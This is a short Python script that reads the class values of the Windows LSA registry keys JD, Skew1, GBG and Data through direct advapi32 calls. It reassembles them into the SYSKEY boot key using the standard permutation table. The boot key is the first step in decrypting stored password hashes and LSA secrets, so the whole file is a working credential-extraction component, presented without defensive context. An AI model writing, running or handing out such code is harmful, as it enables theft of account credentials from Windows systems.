import ctypes
from ctypes import wintypes

# Load the Windows Registry API
advapi32 = ctypes.windll.advapi32
HKEY_LOCAL_MACHINE = 0x80000002
KEY_READ = 0x20019

def get_boot_key_c_style():
    keys = ["JD", "Skew1", "GBG", "Data"]
    base_path = r"SYSTEM\CurrentControlSet\Control\Lsa\\"
    scrambled_hex = ""

    print("--- C-Style API Direct Access ---")

    for key_name in keys:
        h_key = wintypes.HKEY()
        full_path = base_path + key_name
        
        # Open the key exactly like the C code
        res = advapi32.RegOpenKeyExA(HKEY_LOCAL_MACHINE, full_path.encode(), 0, KEY_READ, ctypes.byref(h_key))
        
        if res != 0:
            print(f"[!] Failed to open {key_name}. Error: {res}")
            continue

        # Prepare buffers for RegQueryInfoKeyA
        class_buffer = ctypes.create_string_buffer(256)
        class_size = wintypes.DWORD(256)

        # Calling the ANSI version specifically
        res = advapi32.RegQueryInfoKeyA(
            h_key, class_buffer, ctypes.byref(class_size),
            None, None, None, None, None, None, None, None, None
        )

        if res == 0:
            fragment = class_buffer.value.decode('ascii')
            print(f"[+] Found {key_name}: {fragment}")
            scrambled_hex += fragment
        else:
            print(f"[!] Could not read class for {key_name}. Error: {res}")

        advapi32.RegCloseKey(h_key)

    if len(scrambled_hex) == 32:
        # Permutation logic
        boot_key_bytes = bytearray.fromhex(scrambled_hex)
        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        final_key = bytearray(16)
        for i in range(16):
            final_key[i] = boot_key_bytes[transforms[i]]
        return final_key.hex().upper()
    
    return None

result = get_boot_key_c_style()
if result:
    print(f"\nSUCCESS! Boot Key: {result}")
else:
    print("\nFAILED: Still could not retrieve the full key.")
